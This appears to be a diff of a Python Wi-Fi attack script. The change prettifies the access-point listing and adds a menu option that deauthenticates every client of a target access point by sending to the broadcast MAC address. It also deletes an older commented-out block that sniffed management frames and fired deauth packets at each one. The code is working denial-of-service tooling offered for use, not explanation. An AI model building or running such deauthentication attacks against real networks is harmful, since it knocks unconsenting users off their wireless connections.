@@ -95,7 +95,16 @@ def scan_network() -> bool:
 def show_aps():
     # Check if we have scanned the network. If so, show APs from scanner.wifis
     if scanner.wifis:
-        print(scanner.wifis)
+        # Print APs in a nice way
+        for i, wifi in enumerate(scanner.wifis):
+            print(f"{i}. {wifi.SSID} - {wifi.BSSID}")
+        
+        # Prompt user if they want more info on AP
+        more_info = input("Do you want more info on AP? (y/n): ").strip()
+        if more_info == "y":
+            AP_to_show = int(input("Input index of AP to show: "))
+            print(scanner.wifis[AP_to_show])
+        
     else:
         print("No APs found. Try scanning network first.")
         return False
@@ -158,10 +167,13 @@ def send_deauth():
         for i, client in enumerate(target_ap.clients):
             print(f"{i}. {client}")
         print(f"{len(target_ap.clients)+1}. User defined client")
-        client_to_deauth = int(input("Input index of client to deauth: "))
+        print(f"{len(target_ap.clients)+2}. Deauth all clients")
+        client_to_deauth = int(input("Input choice: "))
 
         if client_to_deauth == len(target_ap.clients) + 1:
             target_client = input("Input client MAC for deauth: ")
+        elif client_to_deauth == len(target_ap.clients) + 2:
+            target_client = "ff:ff:ff:ff:ff:ff"
         else:
             target_client = target_ap.clients[client_to_deauth]
 
@@ -227,45 +239,6 @@ with Scanner(INTERFACE) as scanner:
         print("\nExiting...")
         sys.exit(0)
 
-
-"""
-with Scanner(INTERFACE) as scanner:
-
-    action = input("Input action wanted:\n1. Scan network.\n2. Show clients\n3. Send deauth\n4. exit\n")
-
-    if action == "1":
-        # AP_info = scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_TO_ATTACK)
-        AP_info = scanner.get_ap(timeout=TIMEOUT)
-        print(AP_info)
-        print(scanner.wifis)
-        channel = AP_info.Channel[0]
-        BSSID = AP_info.index[0]
-
-        # change channel to be on APs channelwifi: Wifi
-        scanner.set_channel(channel)
-        print(f"Channel is: {scanner.curr_channel}")
-
-    elif action == "2":
-        target_ap = input("Input AP BSSID for client scan: ")
-        print(f"Extracting client list for AP: {target_ap}")
-        client_list = get_clients_on_ap(TIMEOUT, INTERFACE, target_ap)
-        print(client_list)
-
-    elif action == "3":
-
-        def check_deauth(pkt):
-            print("Recived package")
-            elt = pkt[Dot11Elt]
-            while elt and elt.ID != 0:
-                elt = elt.payload[Dot11Elt]
-            print(elt.info)
-            # if pkt[Dot11].addr1 == BSSID:
-            deauth(INTERFACE, BSSID, pkt[Dot11].addr2, 6)
-
-        sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt", count=20)  # subtype assoc-req")  # start sniffin
-    elif action == "4":
-        exit()
-"""
 
 # channel = AP_info.Channel[0]
 # BSSID = AP_info.index[0]
